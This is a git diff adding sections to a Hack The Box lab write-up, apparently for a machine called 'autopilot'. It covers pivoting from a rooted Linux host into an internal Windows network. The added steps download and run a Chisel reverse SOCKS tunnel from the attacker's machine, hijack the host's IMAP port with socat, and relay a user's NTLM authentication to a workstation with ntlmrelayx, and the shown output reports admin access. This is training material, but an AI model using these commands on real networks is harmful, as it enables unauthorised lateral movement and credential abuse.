@@ -506,10 +506,147 @@ EOF
 
 <img width="833" height="217" alt="image" src="https://github.com/user-attachments/assets/b0a4952c-a382-42ac-b697-c7c2109e7e9e" />
 
-## but shell disconnected so fast we still need to pivote to internal windows server
+## we still need to pivote to internal windows server
+
+---
+
+## Phase 1: Linux Root to Internal Network Access
+
+```
+ip -br addr
+ip route
+```
+
+```
+lo               UNKNOWN        127.0.0.1/8 ::1/128 
+eth0             UP             172.16.20.10/24 fe80::215:5dff:fe32:9101/64 
+```
 
 
 
+>  The Linux server has two interfaces. `eth0` is on the `172.16.20.0/24` network. Our Kali machine is on the `10.10.16.0/24` HTB VPN network and cannot reach `172.16.20.0/24` directly.
+
+
+---
+
+## Deploy a SOCKS Tunnel (Chisel)
+
+**`on kali`**
+
+```
+./chisel_1.8.1_linux_amd64 server -p 8000 --reverse
+```
+
+
+## On Linux (Root): Download and run the Chisel client.
+
+```
+wget http://<KALI_IP>:8080/chisel_1.8.1_linux_amd64 -O /tmp/chisel
+chmod +x /tmp/chisel
+nohup /tmp/chisel client <KALI_IP>:8000 R:socks > /tmp/chisel.log 2>&1 &
+```
+
+
+> This creates a SOCKS5 proxy on `127.0.0.1:1080` on Kali, allowing us to route traffic through the Linux server into the internal network.
+
+---
+
+## Configure ProxyChains
+
+Edit `/etc/proxychains4.conf` and add:
+
+```
+socks5 127.0.0.1 1080
+```
+
+## Enumerate the Internal Network
+
+```
+ip neigh
+```
+
+<img width="825" height="82" alt="image" src="https://github.com/user-attachments/assets/fa76d901-9e0c-45aa-ad38-2e0a083032ef" />
+
+
+> The ARP cache reveals active hosts on the internal network. We discovered 172.16.20.15 (WS02) and 172.16.20.1 (Gateway).
+
+
+---
+
+
+## Phase 2: Capturing Credentials (NTLM Relay)
+
+> WS02 connects to the mail server over IMAP. By intercepting this authentication, we can capture the NTLM hash of `stephanie.lewis` and relay it to WS02 itself to gain a shell.
+
+
+## Step 1: Stop the Real IMAP Service
+
+```
+systemctl stop gromox-imap.service
+```
+
+> We need to free port 143 so our `socat` forwarder can listen on it.
+
+---
+
+## Forward IMAP Traffic to Kali
+
+
+```
+socat TCP-LISTEN:143,fork,reuseaddr TCP:<KALI_IP>:445
+```
+
+> This intercepts WS02's IMAP connection to port 143 on the Linux server and forwards it to port 445 (SMB) on our Kali machine, where ntlmrelayx is listening.
+
+---
+
+##  Start the NTLM Relay Attack
+
+```
+sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://172.16.20.15 -smb2support -socks -socks-port 1081 -i
+```
+
+> This tool listens for SMB authentication on port 445. When it receives a connection, it relays it to smb://172.16.20.15. The -socks flag starts a SOCKS proxy on port 1081 for interactive sessions.
+
+---
+
+## Trigger Authentication
+
+```
+echo "Test" | mail -s "Test" stephanie.lewis@autopilot.htb
+```
+
+> Sending an email forces WS02's Thunderbird client to connect to the mail server (which is now our socat listener), triggering the NTLM authentication.
+
+---
+
+## Capture the Relay
+
+```
+[*] (SMB): Received connection from 172.16.20.15
+[*] (SMB): Authenticating connection from AUTOPILOT/stephanie.lewis@...
+[*] (SMB): Authenticating to smb://172.16.20.15 SUCCEED
+```
+
+> The NTLM hash was successfully relayed, granting us an interactive SMB session as stephanie.lewis.
+
+---
+
+
+## At the `ntlmrelayx>` prompt, type:
+
+```text
+
+socks
+```
+
+It will show you the active relay session:
+
+```text
+
+Protocol  Target          Username                 AdminStatus
+SMB       172.16.20.15    AUTOPILOT/stephanie.lewis  TRUE
+```
 
 
 
